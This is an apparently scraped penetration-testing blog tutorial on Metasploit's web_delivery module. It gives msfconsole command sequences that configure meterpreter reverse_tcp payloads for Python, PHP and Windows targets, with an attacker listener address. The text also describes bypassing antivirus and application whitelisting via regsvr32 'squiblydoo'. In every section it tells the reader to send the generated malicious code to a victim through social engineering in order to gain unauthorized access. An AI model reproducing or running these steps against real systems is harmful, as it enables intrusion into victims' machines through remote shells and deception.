<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Command Injection Exploitation using Web Delivery (Linux, Windows)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/command-injection-exploitation-using-web-delivery-linux-windows/" rel="bookmark"><time class="entry-date published" datetime="2017-11-30T12:04:40+00:00">November 30, 2017</time><time class="updated" datetime="2025-05-27T12:03:25+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! In this article you will learn how to exploit three different platforms [Linux, windows, using a single exploit of the Metasploit framework.</span></p>
<p><span style="color: #000000;"><strong>Requirement</strong></span></p>
<p><span style="color: #000000;"><strong>Attacker</strong>: Kali Linux</span></p>
<p><span style="color: #000000;"><strong>Targeted Platform</strong>: Window,PHP,Linux [ubuntu]</span></p>
<p><span style="color: #000000;">Open the terminal in your Kali Linux and type “<strong>msfconsole</strong>” to load Metasploit framework and execute given below exploit.</span></p>
<p><span style="color: #000000;">This module quickly fires up a web server that serves a payload. The provided command which will allow for a payload to download and execute. It will do it either specified scripting language interpreter or “squiblydoo” via regsvr32.exe for bypassing application whitelisting. The main purpose of this module is to quickly establish a session on a target machine when the attacker has to manually type in the command: e.g. Command Injection, RDP Session, Local Access or maybe Remote Command Execution. This attack vector does not write to disk so it is less likely to trigger AV solutions and will allow privilege escalations supplied by Meterpreter. When using either of the PSH targets, ensure the payload architecture matches the target computer or use SYSWOW64 powershell.exe to execute x86 payloads on x64 machines. Regsvr32 uses “squiblydoo” technique for bypassing application whitelisting. The signed Microsoft binary file, Regsvr32, is able to request an .sct file and then execute the included PowerShell command inside of it. Both web requests (i.e., the .sct file and PowerShell download/execute) can occur on the same port. “PSH (Binary)” will write a file to the disk, allowing for custom binaries to be served up to be downloaded/executed.</span></p>
<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
msf exploit (web_delivery)&gt;show targets</pre>
<p><span style="color: #000000;">From given below image you can observe that there are 5 targets, which help you in generating malicious code to create a backdoor in the victim system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uM23HLN3IVw/Wh_wtVr-2aI/AAAAAAAASiE/qPEqnswCdmYRR9RncO9Q8-wr96CsUexvACEwYBhgL/s1600/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploit Linux Platform [python]</strong></span></h3>
<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
msf exploit (web_delivery)&gt;set lhost 192.168.1.132
msf exploit (web_delivery)&gt;set lport 4444
msf exploit (web_delivery)&gt;set target 0
msf exploit (web_delivery)&gt;set payload python/meterpreter/reverse_tcp
msf exploit (web_delivery)&gt;run</pre>
<p><span style="color: #000000;">In this exploit we had set target 0 to generate malicious code for python platform, from given below image you can observe the highlighted <strong>malicious python code</strong>, now copy it and send to the victim using social engineering method.</span></p>
<p><span style="color: #000000;">As soon as the victim will execute the malicious code in terminal, the attacker will obtain meterpreter session as unauthorized access of the victim system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-bJglyn28I0c/Wh_wtQdLFBI/AAAAAAAASiA/eWE7fJcvc-QHCqcV9xxN3CV2Bgoww5uYQCEwYBhgL/s1600/2.1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploit Linux Platform [PHP]</strong></span></h3>
<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
msf exploit (web_delivery)&gt;set lhost 192.168.1.132
msf exploit (web_delivery)&gt;set lport 4444
msf exploit (web_delivery)&gt;set target 1
msf exploit (web_delivery)&gt;set payload php/meterpreter/reverse_tcp
msf exploit (web_delivery)&gt;run</pre>
<p><span style="color: #000000;">Now we had set target 1 to generate malicious code for php platform, from given below image you can observe the highlighted <strong>malicious php code</strong>, now copy it and send to the victim using social engineering method.</span></p>
<p><span style="color: #000000;">As soon as the victim will execute the malicious code in a web browser, the attacker will obtain another meterpreter session as unauthorized access of the victim system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-6OvjbqBu1Vw/Wh_wtLYirBI/AAAAAAAASiU/B4ETPaNF4NMCLlgDE0HaarzzYxfzBsbYQCEwYBhgL/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploit Windows Platform [exe]</strong></span></h3>
<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
msf exploit (web_delivery)&gt;set lhost 192.168.1.132
msf exploit (web_delivery)&gt;set lport 4444
msf exploit (web_delivery)&gt;set target 2
msf exploit (web_delivery)&gt;set payload windows/meterpreter/reverse_tcp
msf exploit (web_delivery)&gt;run</pre>
<p><span style="color: #000000;">Further, we had set target 2 to generate malicious code for window platform, from given below image you can observe the highlighted <strong>malicious powershell.exe</strong>, now copy it and send to the victim using social engineering method.</span></p>
<p><span style="color: #000000;">As soon as the victim will execute the malicious code in command prompt, the attacker will obtain a meterpreter session as unauthorized access of the victim system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-S_YXYwxcauM/Wh_wuVpiN4I/AAAAAAAASiU/w6Z5mQFh_nIqNSdAszcqMfHdcFgES9_iwCEwYBhgL/s1600/4.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploit Windows Platform [DLL]</strong></span></h3>
<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
msf exploit (web_delivery)&gt;set lhost 192.168.1.132
msf exploit (web_delivery)&gt;set lport 4444
msf exploit (web_delivery)&gt;set target 3
msf exploit (web_delivery)&gt;set payload windows/meterpreter/reverse_tcp
msf exploit (web_delivery)&gt;run</pre>
<p><span style="color: #000000;">In this exploit we had set target 3 to generate malicious code for window platform, from given below image you can observe the highlighted <strong>malicious dll code</strong>, now copy it and send to the victim using social engineering method.</span></p>
<p><span style="color: #000000;">As soon as the victim will execute the malicious code as run command inside the RUN window, the attacker will again obtain meterpreter session and make unauthorized access in the victim system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-eVZObyDqY3c/Wh_wunBreWI/AAAAAAAASiU/PuH7VFvvgDUcuQijsa2sxXYR7FyVM-62wCEwYBhgL/s1600/5.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploit Windows Platform [Powershell Binary]</strong></span></h3>
<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
msf exploit (web_delivery)&gt;set lhost 192.168.1.132
msf exploit (web_delivery)&gt;set lport 4444
msf exploit (web_delivery)&gt;set target 4
msf exploit (web_delivery)&gt;set payload windows/meterpreter/reverse_tcp
msf exploit (web_delivery)&gt;run</pre>
<p><span style="color: #000000;">In this exploit we had set target 4 to generate malicious code for windows platform, from given below image you can observe the highlighted malicious <strong>powershell.exe binary code</strong>, now copy it and send to the victim using social engineering method.</span></p>
<p><span style="color: #000000;">As soon as the victim will execute the malicious code in command prompt, the attacker will obtain a meterpreter session as unauthorized access of the victim system.</span></p>
<p><span style="color: #000000;">Hence a single exploit “web delivery script” is quite helpful to hack three different platforms.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-4ZskdNG8_30/Wh_wuk1qnbI/AAAAAAAASiU/WrO6WkREp1Mn27mnUWeSoXxtIddJD9kUgCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sanjeet Kumar is an Information Security Analyst | Pentester | Researcher  Contact</span> <a class="broken_link" href="https://www.linkedin.com/in/sanjeet-kumar-27828058/"><strong>Here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
